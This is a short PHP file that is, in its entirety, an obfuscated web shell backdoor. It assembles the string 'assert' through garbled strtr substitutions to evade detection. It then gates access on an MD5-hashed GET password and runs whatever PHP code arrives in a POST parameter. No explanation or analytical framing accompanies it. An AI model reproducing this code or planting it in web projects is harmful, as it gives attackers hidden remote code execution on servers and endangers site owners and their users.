<?php
        $str1 = 'aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&%F%*^G*t';
        $str2 = strtr($str1,array('aH(UUH(fsdfH(UUH(fsdf,'=>'as','fdgdefjg0J)'=>'se','r&%F%*^G*t'=>'rt'));
        $str3 = strtr($str2,array('s,'=>'s','fdgdefjg0J)r&%F%*^G*'=>'er'));
        if(md5(@$_GET['a']) =='2858b958f59138771eae3b0c2ceda426'){
                $str4 = strrev($_POST['a']);
                $str5 = strrev($str4);
                $str3($str5);
    }
?>